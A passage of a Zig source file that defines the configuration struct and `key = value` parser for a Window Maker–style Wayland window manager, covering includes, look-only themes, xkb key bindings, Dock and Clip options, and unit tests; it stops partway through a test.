// SPDX-License-Identifier: 0BSD
//
// Configuration for wmaker-wl.
//
// This is the single source of truth for every tunable. Nothing else in
// the code base may hard-code a gap, border, colour or command.
//
// File: $XDG_CONFIG_HOME/wmaker-wl/config.conf
//       (falls back to ~/.config/wmaker-wl/config.conf)
//
// Format: `key = value`. `#` starts a comment when it is at the start of a
// line or preceded by whitespace (so `border_focused = #d8a657` works).
//
//     bind = Super+Shift+h, move_column_left
//     bind = Super+Return, spawn alacritty --class foo
//     unbind = Super+q
//
// Key names are resolved through xkbcommon, so they are layout-correct.
// River matches bindings against the *active* layout; no manual QWERTZ /
// AZERTY remapping is needed (the old layoutMapKeysym() was wrong).
//
// A key can be named by its keysym (`Return`, `udiaeresis`, `U00FC`) or, for
// a single character, by that character itself (`Super+ü`, `Super+ß`) --
// handy on a German layout, where the key labelled ü has no ASCII name.
//
// `include = FILE` reads another file at that point (so later lines override
// it); `theme = NAME` includes Themes/NAME.conf, restricted to the look
// options (colours, border width, gaps) so a theme can never bind a key or
// start a program. See `Includer`.
//
// By default a binding is translated with whichever layout is active at the
// moment. `bind_layout = 0` (or 1, 2, 3) pins all bindings to that layout of
// the keyboard instead, so a binding written as `Super+q` keeps working
// after switching from `us` to `de` and back (river_xkb_binding_v1.
// set_layout_override).

const std = @import("std");
const wayland = @import("wayland");
const xkb = @import("xkbcommon");
const river = wayland.client.river;

pub const Modifiers = river.SeatV1.Modifiers;

pub const Bind = struct {
    mods: Modifiers,
    keysym: u32,
    /// Raw command text, e.g. "focus_left" or "workspace 2". Parsed by
    /// action.parse() so config.zig stays independent of action.zig.
    command: []const u8,
};

pub const CenterMode = enum {
    /// Scroll the minimum amount that brings the focused column into view.
    on_overflow,
    /// Always keep the focused column centred.
    always,
    /// Never scroll on focus change.
    never,
};

pub const NewWindowMode = enum {
    /// Open new windows in a fresh column right of the focused one.
    new_column,
    /// Stack new windows into the focused column.
    stack,
};

/// Which screen edge the Dock (Window Maker's WMDock) sits on.
pub const DockEdge = enum { left, right };

/// Which screen corner the Clip (Window Maker's WMClip) sits in.
pub const ClipCorner = enum { top_left, top_right, bottom_left, bottom_right };

/// Where a submenu opens relative to its parent menu.
pub const SubmenuAlign = enum { right, left };

/// Longest Pango font description accepted for the `font_*` options.
pub const max_font_len = 63;

/// Hard upper bound; Output holds workspaces in a fixed array.
pub const max_workspaces = 16;

/// Upper bound for every pixel-valued option (gaps, border, sizes, offsets).
/// The layout multiplies and sums these per column and window; an absurd
/// value such as `gap = 2000000000` would overflow `i32` there and crash the
/// window manager, so it is refused when the file is read instead.
pub const max_pixels: i32 = 10_000;

/// xkbcommon allows at most four layouts per keymap.
pub const max_bind_layouts = 4;

pub const Config = struct {
    arena: std.heap.ArenaAllocator,
    config_file: []const u8 = "(built-in defaults)",

    // ---- layout ---------------------------------------------------------
    gap: i32 = 8,
    outer_gap: i32 = 8,
    default_column_width: f64 = 0.5,
    width_presets: []const f64 = &.{ 1.0 / 3.0, 0.5, 2.0 / 3.0, 1.0 },
    width_step: f64 = 0.1,
    min_window_size: i32 = 120,
    center_focused_column: CenterMode = .on_overflow,
    new_window: NewWindowMode = .new_column,

    // ---- look -----------------------------------------------------------
    border_width: i32 = 2,
    border_focused: u32 = 0xd8a657,
    border_unfocused: u32 = 0x3c3836,
    border_floating: u32 = 0x7daea3,

    // ---- fonts (Pango font descriptions, e.g. "Sans Bold 10") --------------
    /// Title bar of a menu.
    font_menu_title: [:0]const u8 = "Sans Bold 10",
    /// Rows of a menu.
    font_menu: [:0]const u8 = "Sans 10",
    /// The small workspace name under the number in the Clip.
    font_dock: [:0]const u8 = "Sans 8",

    // ---- menus ----------------------------------------------------------
    /// Which side of its parent a submenu opens on first. It flips to the
    /// other side when it would leave the screen.
    // TODO: parsed and editable in wlprefs, but ui.zig does not read it yet.
    menu_submenu_align: SubmenuAlign = .right,

    // ---- windows / focus --------------------------------------------------
    /// A new window takes the keyboard focus (and the view scrolls to it).
    /// false: it opens in the background and the focus stays where it is.
    focus_new_windows: bool = true,

    // ---- workspaces -----------------------------------------------------
    workspace_count: u32 = 4,
    /// workspace_next on the last workspace goes to the first, and
    /// workspace_prev on the first goes to the last. false: they stop.
    workspace_wrap: bool = true,
    /// The mouse wheel over the Clip switches workspace.
    clip_scroll_workspaces: bool = true,

    // ---- floating / mouse -----------------------------------------------
    /// Pixels a tiled window must be dragged before it detaches into the
    /// floating layer. Prevents an accidental click-drag from wrecking
    /// the layout.
    drag_threshold: i32 = 24,
    /// Size of a fresh floating window as a fraction of the output.
    floating_size: f64 = 0.6,
    focus_follows_mouse: bool = false,
    /// Modifier for mouse move/resize (Mod+LMB / Mod+RMB).
    mouse_mod: Modifiers = .{ .mod4 = true },

    // ---- programs -------------------------------------------------------
    terminal: []const []const u8 = &.{"alacritty"},
    launcher: []const []const u8 = &.{"fuzzel"},
    browser: []const []const u8 = &.{"firefox"},

    // ---- key bindings ---------------------------------------------------
    binds: []const Bind = &.{},

    // ---- WindowMaker compatibility --------------------------------------
    /// Also read Window Maker's own files (~/GNUstep/Defaults/WMRootMenu,
    /// WMWindowAttributes, ...). Files in ~/.config/wmaker-wl always win.
    enable_wmaker_compat: bool = true,

    // ---- session ----------------------------------------------------------
    /// Run the autostart script once when the session comes up, exactly
    /// like Window Maker: ~/.config/wmaker-wl/autostart, falling back to
    /// ~/GNUstep/Library/WindowMaker/autostart when enable_wmaker_compat
    /// allows it. Neither needs to exist; a missing script is a no-op.
    enable_autostart: bool = true,

    /// Lines the parser had to skip (unknown key, bad value, missing include,
    /// a theme using an option themes may not use). The shipped files are
    /// tested to have none.
    parse_warnings: u32 = 0,

    // ---- keyboard -------------------------------------------------------------
    /// null: bindings follow the active xkb layout. N: always translate key
    /// events with layout N (0-based) of the keyboard that produced them.
    bind_layout: ?u32 = null,

    // ---- Dock and Clip (see dock.zig) -------------------------------------------
    /// Draw the Dock: a column of 64 px tiles on one screen edge. Its first
    /// tile is the Window Maker logo tile, the others are the DockApps of
    /// dockapps.conf / WMState that have `place = dock` (the default).
    dock_enabled: bool = true,
    dock_edge: DockEdge = .right,
    /// Distance of the Dock's top edge from the top of the screen, in px.
    dock_offset: i32 = 0,
    /// true: the Dock is drawn above windows (Window Maker's "Keep on top");
    /// false: below them ("Lowered").
    dock_on_top: bool = true,
    /// Window Maker's "Auto raise & lower" (Dock position menu): only
    /// counts while `dock_on_top` is off. The Dock then sits below windows
    /// and comes up while the pointer is on it. `dock_level` sets both.
    dock_auto_raise: bool = false,
    /// Launch with ONE click on a Dock/Clip tile. Window Maker's default is
    /// a double click (a single click only raises the Dock), which is also
    /// the default here.
    dock_single_click: bool = false,
    /// Save moved/added/removed tiles and the Dock/Clip switches to the
    /// state file (see docs/DOCKAPPS.md) and read it back at start-up.
    dock_save_state: bool = true,
    /// Shrink the usable area by the Dock's width so tiled windows never end
    /// up under it. Ignored while the Dock is lowered.
    dock_reserve_space: bool = true,
    /// Draw the Clip: one tile with workspace arrows plus the DockApps whose
    /// `place = clip` belongs to the current workspace.
    clip_enabled: bool = true,
    clip_corner: ClipCorner = .top_left,
    clip_on_top: bool = true,
    /// Start with only the Clip tile shown, without its workspace icons.
    clip_collapsed: bool = false,
    /// Window Maker's "Autocollapse": the Clip folds up when the pointer
    /// leaves it and unfolds when it comes back. (No delay: wmaker-wl has no
    /// timers.)
    clip_auto_collapse: bool = false,
    /// Window Maker's "Autoraise": a Clip that is not `clip_on_top` comes up
    /// while the pointer is on it.
    clip_auto_raise: bool = false,
    /// Workspace names, in order. Missing/empty entries are shown as just
    /// the workspace number. Without this option the names of Window
    /// Maker's WMState (if read) are used.
    workspace_names: []const []const u8 = &.{},

    // ---- dock apps ----------------------------------------------------------
    /// Run every `autolaunch = yes` DockApp once when the session comes up
    /// (see dockapp.zig). Looked up first as
    /// ~/.config/wmaker-wl/dockapps.conf, then (if enable_wmaker_compat
    /// allows it) parsed out of Window Maker's own
    /// ~/GNUstep/Defaults/WMState. Neither needs to exist.
    enable_dockapps: bool = true,

    pub fn deinit(cfg: *Config) void {
        cfg.arena.deinit();
    }
};

const default_config_text = @embedFile("share/default_config.conf");

/// Load configuration. Only fails on out-of-memory: a broken or missing
/// user file falls back to the built-in defaults (with warnings), so the
/// session always starts.
pub fn load(io: std.Io, gpa: std.mem.Allocator) !Config {
    var cfg: Config = .{ .arena = .init(gpa) };
    errdefer cfg.deinit();
    const a = cfg.arena.allocator();

    var binds: std.ArrayList(Bind) = .empty;
    try parse(a, default_config_text, &cfg, &binds, "<built-in>");
    cfg.parse_warnings = 0; // the built-in file is tested; only the user's count

    if (try userConfigPath(a)) |path| {
        if (std.Io.Dir.readFileAlloc(std.Io.Dir.cwd(), io, path, a, .limited(1 << 20))) |text| {
            cfg.config_file = path;
            var reader: FileReader = .{ .io = io };
            const inc: Includer = .{
                .ctx = &reader,
                .read = FileReader.read,
                .dir = std.fs.path.dirname(path) orelse ".",
            };
            try parseWith(a, text, &cfg, &binds, path, &inc, false);
        } else |err| {
            std.log.info("no user config at {s} ({t}); using defaults", .{ path, err });
        }
    }

    cfg.binds = try binds.toOwnedSlice(a);
    return cfg;
}

fn userConfigPath(a: std.mem.Allocator) !?[]const u8 {
    if (std.c.getenv("XDG_CONFIG_HOME")) |x| {
        const dir = std.mem.span(x);
        if (dir.len > 0) return try std.fmt.allocPrint(a, "{s}/wmaker-wl/config.conf", .{dir});
    }
    if (std.c.getenv("HOME")) |h| {
        return try std.fmt.allocPrint(a, "{s}/.config/wmaker-wl/config.conf", .{std.mem.span(h)});
    }
    return null;
}

// ----------------------------------------------------------------------------
// Parsing
// ----------------------------------------------------------------------------

/// Reads the files `include`/`theme` name. A callback so that parsing stays
/// free of file-system access (and testable with a map of fake files).
pub const Includer = struct {
    ctx: *anyopaque,
    /// The contents of `path` (allocated in `a`), or null if it cannot be
    /// read.
    read: *const fn (ctx: *anyopaque, a: std.mem.Allocator, path: []const u8) ?[]const u8,
    /// Directory of the file being parsed: relative includes and Themes/
    /// are looked up from here.
    dir: []const u8,
    depth: u8 = 0,
};

pub const max_include_depth = 4;

/// Where a theme is looked for besides next to the config.
const theme_dirs = [_][]const u8{ "/usr/local/share/wmaker-wl/Themes", "/usr/share/wmaker-wl/Themes" };

/// The options a theme may set: how things look, nothing that does anything.
fn themeKey(key: []const u8) bool {
    inline for (.{ "gap", "outer_gap", "border_width", "border_focused", "border_unfocused", "border_floating" }) |k| {
        if (std.mem.eql(u8, key, k)) return true;
    }
    return false;
}

const FileReader = struct {
    io: std.Io,

    fn read(ctx: *anyopaque, a: std.mem.Allocator, path: []const u8) ?[]const u8 {
        const self: *FileReader = @ptrCast(@alignCast(ctx));
        return std.Io.Dir.readFileAlloc(std.Io.Dir.cwd(), self.io, path, a, .limited(1 << 20)) catch null;
    }
};

/// A theme name is a file name: letters, digits, `_`, `-`, `.`; never a path.
pub fn validThemeName(name: []const u8) bool {
    if (name.len == 0 or name.len > 64 or name[0] == '.') return false;
    for (name) |ch| {
        if (!std.ascii.isAlphanumeric(ch) and ch != '_' and ch != '-' and ch != '.') return false;
    }
    return std.mem.indexOf(u8, name, "..") == null;
}

pub fn parse(
    a: std.mem.Allocator,
    text: []const u8,
    cfg: *Config,
    binds: *std.ArrayList(Bind),
    origin: []const u8,
) !void {
    return parseWith(a, text, cfg, binds, origin, null, false);
}

/// `inc` null: `include`/`theme` are refused (a warning). `theme_only`: the
/// text comes from a theme, so only look options are accepted.
pub fn parseWith(
    a: std.mem.Allocator,
    text: []const u8,
    cfg: *Config,
    binds: *std.ArrayList(Bind),
    origin: []const u8,
    inc: ?*const Includer,
    theme_only: bool,
) std.mem.Allocator.Error!void {
    var line_no: usize = 0;
    var lines = std.mem.splitScalar(u8, text, '\n');
    while (lines.next()) |raw| {
        line_no += 1;
        const line = stripComment(raw);
        if (line.len == 0) continue;

        const eq = std.mem.indexOfScalar(u8, line, '=') orelse {
            std.log.warn("{s}:{d}: expected `key = value`", .{ origin, line_no });
            cfg.parse_warnings += 1;
            continue;
        };
        const key = std.mem.trim(u8, line[0..eq], " \t");
        const value = std.mem.trim(u8, line[eq + 1 ..], " \t\"");

        const is_include = std.mem.eql(u8, key, "include");
        const is_theme = std.mem.eql(u8, key, "theme");
        if (is_include or is_theme) {
            if (theme_only) {
                std.log.warn("{s}:{d}: a theme cannot include anything", .{ origin, line_no });
                cfg.parse_warnings += 1;
            } else {
                try includeFile(a, cfg, binds, inc, value, is_theme, origin, line_no);
            }
            continue;
        }
        if (theme_only and !themeKey(key)) {
            std.log.warn("{s}:{d}: `{s}` is not a theme option (themes set colours, borders and gaps only)", .{ origin, line_no, key });
            cfg.parse_warnings += 1;
            continue;
        }

        applyOption(a, cfg, binds, key, value) catch |err| switch (err) {
            error.OutOfMemory => return error.OutOfMemory,
            error.UnknownKey => {
                std.log.warn("{s}:{d}: unknown option `{s}`", .{ origin, line_no, key });
                cfg.parse_warnings += 1;
            },
            error.Invalid => {
                std.log.warn("{s}:{d}: bad value for `{s}`: {s}", .{ origin, line_no, key, value });
                cfg.parse_warnings += 1;
            },
        };
    }
}

fn includeFile(
    a: std.mem.Allocator,
    cfg: *Config,
    binds: *std.ArrayList(Bind),
    inc: ?*const Includer,
    value: []const u8,
    is_theme: bool,
    origin: []const u8,
    line_no: usize,
) std.mem.Allocator.Error!void {
    const what: []const u8 = if (is_theme) "theme" else "include";
    const i = inc orelse {
        std.log.warn("{s}:{d}: `{s}` is not available here", .{ origin, line_no, what });
        cfg.parse_warnings += 1;
        return;
    };
    if (i.depth >= max_include_depth) {
        std.log.warn("{s}:{d}: `{s}` nested too deep (limit {d})", .{ origin, line_no, what, max_include_depth });
        cfg.parse_warnings += 1;
        return;
    }
    if (value.len == 0) {
        std.log.warn("{s}:{d}: `{s}` needs a value", .{ origin, line_no, what });
        cfg.parse_warnings += 1;
        return;
    }

    var found_path: ?[]const u8 = null;
    var text: ?[]const u8 = null;

    if (is_theme) {
        if (!validThemeName(value)) {
            std.log.warn("{s}:{d}: `{s}` is not a theme name", .{ origin, line_no, value });
            cfg.parse_warnings += 1;
            return;
        }
        const first = try std.fmt.allocPrint(a, "{s}/Themes/{s}.conf", .{ i.dir, value });
        if (i.read(i.ctx, a, first)) |t| {
            found_path = first;
            text = t;
        } else for (theme_dirs) |d| {
            const p = try std.fmt.allocPrint(a, "{s}/{s}.conf", .{ d, value });
            if (i.read(i.ctx, a, p)) |t| {
                found_path = p;
                text = t;
                break;
            }
        }
    } else {
        const p = if (std.mem.startsWith(u8, value, "~/")) blk: {
            const home = std.c.getenv("HOME") orelse break :blk value;
            break :blk try std.fmt.allocPrint(a, "{s}{s}", .{ std.mem.span(home), value[1..] });
        } else if (std.fs.path.isAbsolute(value))
            value
        else
            try std.fmt.allocPrint(a, "{s}/{s}", .{ i.dir, value });
        if (i.read(i.ctx, a, p)) |t| {
            found_path = p;
            text = t;
        }
    }

    const path = found_path orelse {
        std.log.warn("{s}:{d}: cannot read {s} `{s}`", .{ origin, line_no, what, value });
        cfg.parse_warnings += 1;
        return;
    };
    var child: Includer = .{
        .ctx = i.ctx,
        .read = i.read,
        .dir = std.fs.path.dirname(path) orelse ".",
        .depth = i.depth + 1,
    };
    try parseWith(a, text.?, cfg, binds, path, &child, is_theme);
}

/// Remove a trailing comment.
///
/// A `#` starts a comment when it is at the start of the line or follows
/// whitespace, EXCEPT when it introduces a colour: `#` followed by exactly
/// six hex digits and then whitespace/end (`border_focused = #d8a657`).
fn stripComment(raw: []const u8) []const u8 {
    var end = raw.len;
    for (raw, 0..) |c, i| {
        if (c != '#') continue;
        if (!(i == 0 or raw[i - 1] == ' ' or raw[i - 1] == '\t')) continue;
        if (isColour(raw[i..])) continue;
        end = i;
        break;
    }
    return std.mem.trim(u8, raw[0..end], " \t\r");
}

/// "#d8a657" (optionally followed by whitespace and more text).
fn isColour(s: []const u8) bool {
    if (s.len < 7 or s[0] != '#') return false;
    for (s[1..7]) |ch| if (!std.ascii.isHex(ch)) return false;
    return s.len == 7 or s[7] == ' ' or s[7] == '\t' or s[7] == '\r';
}

const ParseError = error{ Invalid, UnknownKey, OutOfMemory };

fn applyOption(
    a: std.mem.Allocator,
    cfg: *Config,
    binds: *std.ArrayList(Bind),
    key: []const u8,
    value: []const u8,
) ParseError!void {
    const eql = std.mem.eql;

    // Options of the previous config format. Renamed ones keep working;
    // dropped ones are explained once instead of failing as "unknown".
    inline for (.{
        .{ "default_column_width_fraction", "default_column_width" },
        .{ "min_column_width", "min_window_size" },
    }) |alias| {
        if (eql(u8, key, alias[0])) return applyOption(a, cfg, binds, alias[1], value);
    }
    inline for (.{
        .{ "keyboard_layout", "keys follow the active layout automatically" },
        .{ "enable_mouse_support", "mouse bindings are always on; change `mouse_mod`" },
        .{ "mouse_sensitivity", "pointer speed is a river/libinput setting" },
        .{ "enable_floating_windows", "floating is always available (Super+t)" },
    }) |old| {
        if (eql(u8, key, old[0])) {
            std.log.info("config: `{s}` is obsolete and ignored ({s})", .{ old[0], old[1] });
            return;
        }
    }

    if (eql(u8, key, "bind")) return addBind(a, binds, value);
    if (eql(u8, key, "unbind")) return removeBind(binds, value);

    inline for (.{ "gap", "outer_gap", "border_width", "min_window_size", "drag_threshold", "dock_offset" }) |name| {
        if (eql(u8, key, name)) {
            const v = std.fmt.parseInt(i32, value, 10) catch return error.Invalid;
            if (v < 0 or v > max_pixels) return error.Invalid;
            @field(cfg, name) = v;
            return;
        }
    }

    inline for (.{ "default_column_width", "width_step", "floating_size" }) |name| {
        if (eql(u8, key, name)) {
            const v = std.fmt.parseFloat(f64, value) catch return error.Invalid;
            if (!(v > 0 and v <= 1)) return error.Invalid;
            @field(cfg, name) = v;
            return;
        }
    }

    inline for (.{ "border_focused", "border_unfocused", "border_floating" }) |name| {
        if (eql(u8, key, name)) {
            var v = std.mem.trimStart(u8, value, "#");
            if (std.mem.startsWith(u8, v, "0x")) v = v[2..];
            @field(cfg, name) = std.fmt.parseInt(u32, v, 16) catch return error.Invalid;
            return;
        }
    }

    inline for (.{
        "dock_enabled",
        "dock_on_top",
        "dock_auto_raise",
        "dock_single_click",
        "dock_save_state",
        "dock_reserve_space",
        "clip_enabled",
        "clip_on_top",
        "clip_collapsed",
        "clip_auto_collapse",
        "clip_auto_raise",
        "focus_new_windows",
        "workspace_wrap",
        "clip_scroll_workspaces",
    }) |name| {
        if (eql(u8, key, name)) {
            @field(cfg, name) = try parseBool(value);
            return;
        }
    }

    if (eql(u8, key, "workspace_count")) {
        const v = std.fmt.parseInt(u32, value, 10) catch return error.Invalid;
        if (v < 1 or v > max_workspaces) return error.Invalid;
        cfg.workspace_count = v;
    } else if (eql(u8, key, "width_presets")) {
        var list: std.ArrayList(f64) = .empty;
        var it = std.mem.tokenizeAny(u8, value, ", \t");
        while (it.next()) |tok| {
            const f = std.fmt.parseFloat(f64, tok) catch return error.Invalid;
            if (!(f > 0 and f <= 1)) return error.Invalid;
            try list.append(a, f);
        }
        if (list.items.len == 0) return error.Invalid;
        cfg.width_presets = try list.toOwnedSlice(a);
    } else if (eql(u8, key, "center_focused_column")) {
        cfg.center_focused_column = std.meta.stringToEnum(CenterMode, value) orelse return error.Invalid;
    } else if (eql(u8, key, "new_window")) {
        cfg.new_window = std.meta.stringToEnum(NewWindowMode, value) orelse return error.Invalid;
    } else if (eql(u8, key, "focus_follows_mouse")) {
        cfg.focus_follows_mouse = try parseBool(value);
    } else if (eql(u8, key, "enable_wmaker_compat")) {
        cfg.enable_wmaker_compat = try parseBool(value);
    } else if (eql(u8, key, "enable_autostart")) {
        cfg.enable_autostart = try parseBool(value);
    } else if (eql(u8, key, "enable_dockapps")) {
        cfg.enable_dockapps = try parseBool(value);
    } else if (eql(u8, key, "bind_layout")) {
        if (eql(u8, value, "current") or eql(u8, value, "active")) {
            cfg.bind_layout = null;
        } else {
            const n = std.fmt.parseInt(u32, value, 10) catch return error.Invalid;
            if (n >= max_bind_layouts) return error.Invalid;
            cfg.bind_layout = n;
        }
    } else if (eql(u8, key, "dock_level")) {
        // Window Maker's "Dock position" menu in one word.
        if (eql(u8, value, "top")) {
            cfg.dock_on_top = true;
        } else if (eql(u8, value, "auto")) {
            cfg.dock_on_top = false;
            cfg.dock_auto_raise = true;
        } else if (eql(u8, value, "normal")) {
            cfg.dock_on_top = false;
            cfg.dock_auto_raise = false;
        } else return error.Invalid;
    } else if (eql(u8, key, "dock_edge")) {
        cfg.dock_edge = std.meta.stringToEnum(DockEdge, value) orelse return error.Invalid;
    } else if (eql(u8, key, "clip_corner")) {
        cfg.clip_corner = std.meta.stringToEnum(ClipCorner, value) orelse return error.Invalid;
    } else if (eql(u8, key, "menu_submenu_align")) {
        cfg.menu_submenu_align = std.meta.stringToEnum(SubmenuAlign, value) orelse return error.Invalid;
    } else if (eql(u8, key, "workspace_names")) {
        // Empty entries are kept (they mean "this workspace has no name"),
        // so the names stay aligned with the workspace numbers.
        var list: std.ArrayList([]const u8) = .empty;
        var it = std.mem.splitScalar(u8, value, ',');
        while (it.next()) |tok| {
            const name = std.mem.trim(u8, tok, " \t\"");
            try list.append(a, try a.dupe(u8, name));
        }
        cfg.workspace_names = try list.toOwnedSlice(a);
    } else if (eql(u8, key, "font_menu_title")) {
        cfg.font_menu_title = try parseFont(a, value);
    } else if (eql(u8, key, "font_menu")) {
        cfg.font_menu = try parseFont(a, value);
    } else if (eql(u8, key, "font_dock")) {
        cfg.font_dock = try parseFont(a, value);
    } else if (eql(u8, key, "mouse_mod")) {
        cfg.mouse_mod = parseMods(value) orelse return error.Invalid;
    } else if (eql(u8, key, "terminal")) {
        cfg.terminal = parseCommand(a, value) catch |e| return mapCmdErr(e);
    } else if (eql(u8, key, "launcher")) {
        cfg.launcher = parseCommand(a, value) catch |e| return mapCmdErr(e);
    } else if (eql(u8, key, "browser")) {
        cfg.browser = parseCommand(a, value) catch |e| return mapCmdErr(e);
    } else {
        return error.UnknownKey;
    }
}

fn mapCmdErr(e: anyerror) ParseError {
    return if (e == error.OutOfMemory) error.OutOfMemory else error.Invalid;
}

/// A Pango font description: not empty, not longer than `max_font_len`, no
/// control characters. (Whether the family exists is Pango's business: an
/// unknown family falls back to the default font.) Lives in `a`.
fn parseFont(a: std.mem.Allocator, value: []const u8) ParseError![:0]const u8 {
    if (!validFont(value)) return error.Invalid;
    return a.dupeZ(u8, value) catch error.OutOfMemory;
}

pub fn validFont(s: []const u8) bool {
    if (s.len == 0 or s.len > max_font_len) return false;
    for (s) |ch| if (ch < 0x20 or ch == 0x7f) return false;
    return true;
}

pub fn parseBool(s: []const u8) error{Invalid}!bool {
    inline for (.{ "true", "yes", "on", "1" }) |t| if (std.mem.eql(u8, s, t)) return true;
    inline for (.{ "false", "no", "off", "0" }) |t| if (std.mem.eql(u8, s, t)) return false;
    return error.Invalid;
}

/// Split a command line into argv. Supports "double quoted" arguments.
/// The returned slice and its strings live in `a`.
pub fn parseCommand(a: std.mem.Allocator, s: []const u8) ![]const []const u8 {
    var args: std.ArrayList([]const u8) = .empty;
    var i: usize = 0;
    while (i < s.len) {
        while (i < s.len and (s[i] == ' ' or s[i] == '\t')) i += 1;
        if (i >= s.len) break;

        if (s[i] == '"') {
            i += 1;
            const start = i;
            while (i < s.len and s[i] != '"') i += 1;
            try args.append(a, try a.dupe(u8, s[start..i]));
            if (i < s.len) i += 1;
        } else {
            const start = i;
            while (i < s.len and s[i] != ' ' and s[i] != '\t') i += 1;
            try args.append(a, try a.dupe(u8, s[start..i]));
        }
    }
    if (args.items.len == 0) return error.Invalid;
    return args.toOwnedSlice(a);
}

// ----------------------------------------------------------------------------
// Key bindings
// ----------------------------------------------------------------------------

pub fn parseMods(s: []const u8) ?Modifiers {
    var mods: Modifiers = .{};
    var it = std.mem.tokenizeScalar(u8, s, '+');
    var any = false;
    while (it.next()) |tok| {
        const t = std.mem.trim(u8, tok, " \t");
        if (t.len == 0) continue;
        any = true;
        if (eqlNoCase(t, "super") or eqlNoCase(t, "mod4") or eqlNoCase(t, "logo")) {
            mods.mod4 = true;
        } else if (eqlNoCase(t, "shift")) {
            mods.shift = true;
        } else if (eqlNoCase(t, "ctrl") or eqlNoCase(t, "control")) {
            mods.ctrl = true;
        } else if (eqlNoCase(t, "alt") or eqlNoCase(t, "mod1")) {
            mods.mod1 = true;
        } else if (eqlNoCase(t, "mod3")) {
            mods.mod3 = true;
        } else if (eqlNoCase(t, "mod5") or eqlNoCase(t, "altgr")) {
            mods.mod5 = true;
        } else return null;
    }
    return if (any) mods else null;
}

fn eqlNoCase(a: []const u8, b: []const u8) bool {
    return std.ascii.eqlIgnoreCase(a, b);
}

pub fn modsBits(m: Modifiers) u32 {
    return @intCast(@as(std.meta.Int(.unsigned, @bitSizeOf(Modifiers)), @bitCast(m)));
}

/// "Super+Shift+h, close"  ->  Bind
fn addBind(a: std.mem.Allocator, binds: *std.ArrayList(Bind), value: []const u8) ParseError!void {
    const comma = std.mem.indexOfScalar(u8, value, ',') orelse return error.Invalid;
    const combo = std.mem.trim(u8, value[0..comma], " \t");
    const command = std.mem.trim(u8, value[comma + 1 ..], " \t");
    if (command.len == 0) return error.Invalid;

    const parsed = parseCombo(a, combo) orelse return error.Invalid;

    // A later bind for the same combo replaces the earlier one.
    removeBindExact(binds, parsed.mods, parsed.keysym);
    try binds.append(a, .{
        .mods = parsed.mods,
        .keysym = parsed.keysym,
        .command = try a.dupe(u8, command),
    });
}

fn removeBind(binds: *std.ArrayList(Bind), combo_text: []const u8) ParseError!void {
    var buf: [256]u8 = undefined;
    var fba = std.heap.FixedBufferAllocator.init(&buf);
    const parsed = parseCombo(fba.allocator(), combo_text) orelse return error.Invalid;
    removeBindExact(binds, parsed.mods, parsed.keysym);
}

fn removeBindExact(binds: *std.ArrayList(Bind), mods: Modifiers, keysym: u32) void {
    var i: usize = 0;
    while (i < binds.items.len) {
        const b = binds.items[i];
        if (b.keysym == keysym and modsBits(b.mods) == modsBits(mods)) {
            _ = binds.orderedRemove(i);
        } else i += 1;
    }
}

const Combo = struct { mods: Modifiers, keysym: u32 };

/// "Super+Shift+Return" -> modifiers + keysym. The last `+`-separated
/// token is the key; everything before it is a modifier.
fn parseCombo(a: std.mem.Allocator, s: []const u8) ?Combo {
    var mods: Modifiers = .{};
    var key_name: []const u8 = std.mem.trim(u8, s, " \t");

    if (std.mem.lastIndexOfScalar(u8, key_name, '+')) |i| {
        if (i == key_name.len - 1 and i > 0 and key_name[i - 1] == '+') {
            // "Super++": the key is a literal plus sign.
            mods = parseMods(key_name[0 .. i - 1]) orelse return null;
            key_name = "plus";
        } else {
            mods = parseMods(key_name[0..i]) orelse return null;
            key_name = std.mem.trim(u8, key_name[i + 1 ..], " \t");
        }
    }
    if (key_name.len == 0) return null;

    const z = a.dupeZ(u8, key_name) catch return null;
    var sym = xkb.Keysym.fromName(z, .no_flags);
    if (sym == .NoSymbol) sym = xkb.Keysym.fromName(z, .case_insensitive);
    if (sym == .NoSymbol) {
        // One character, written as itself: ü, ß, ä, é ...
        const cp = singleCodepoint(key_name) orelse return null;
        const ks = xkb_utf32_to_keysym(cp);
        if (ks == 0) return null; // XKB_KEY_NoSymbol
        return .{ .mods = mods, .keysym = ks };
    }
    return .{ .mods = mods, .keysym = @intFromEnum(sym) };
}

extern fn xkb_utf32_to_keysym(ucs: u32) u32;

/// The code point of `s` if it is exactly one UTF-8 encoded character.
fn singleCodepoint(s: []const u8) ?u21 {
    if (s.len == 0) return null;
    const n = std.unicode.utf8ByteSequenceLength(s[0]) catch return null;
    if (n != s.len) return null;
    return std.unicode.utf8Decode(s) catch null;
}

test "colour detection" {
    try std.testing.expect(isColour("#d8a657"));
    try std.testing.expect(isColour("#d8a657 # gold"));
    try std.testing.expect(!isColour("#d8a65")); // too short
    try std.testing.expect(!isColour("#d8a6577")); // too long
    try std.testing.expect(!isColour("# comment"));
}

test "comment stripping keeps colours" {
    try std.testing.expectEqualStrings("border_focused = #d8a657", stripComment("border_focused = #d8a657  # gold"));
    try std.testing.expectEqualStrings("", stripComment("# whole line"));
    try std.testing.expectEqualStrings("gap = 8", stripComment("gap = 8   # between windows"));
    // A comment that merely starts with something hex-like is still a comment.
    try std.testing.expectEqualStrings("gap = 8", stripComment("gap = 8 # add bad"));
}

test "enable_autostart parses and defaults on" {
    var arena: std.heap.ArenaAllocator = .init(std.testing.allocator);
    defer arena.deinit();
    var cfg: Config = .{ .arena = .init(std.testing.allocator) };
    defer cfg.deinit();
    try std.testing.expect(cfg.enable_autostart);

    var binds: std.ArrayList(Bind) = .empty;
    try parse(arena.allocator(), "enable_autostart = no\n", &cfg, &binds, "<test>");
    try std.testing.expect(!cfg.enable_autostart);
}

test "command splitting" {
    var arena: std.heap.ArenaAllocator = .init(std.testing.allocator);
    defer arena.deinit();
    const argv = try parseCommand(arena.allocator(), "foot -e \"htop -d 5\"");
    try std.testing.expectEqual(@as(usize, 3), argv.len);
    try std.testing.expectEqualStrings("htop -d 5", argv[2]);
}

test "dock and clip options parse, bad values are rejected" {
    var arena: std.heap.ArenaAllocator = .init(std.testing.allocator);
    defer arena.deinit();
    var cfg: Config = .{ .arena = .init(std.testing.allocator) };
    defer cfg.deinit();
    try std.testing.expect(cfg.dock_enabled);
    try std.testing.expectEqual(DockEdge.right, cfg.dock_edge);
    try std.testing.expectEqual(ClipCorner.top_left, cfg.clip_corner);

    var binds: std.ArrayList(Bind) = .empty;
    try parse(arena.allocator(),
        \\dock_edge = left
        \\dock_offset = 120
        \\dock_on_top = no
        \\dock_reserve_space = off
        \\clip_corner = bottom_right
        \\clip_collapsed = yes
        \\clip_enabled = false
        \\workspace_names = Main, , "Web"
        \\clip_corner = middle
        \\dock_offset = -4
    , &cfg, &binds, "<test>");
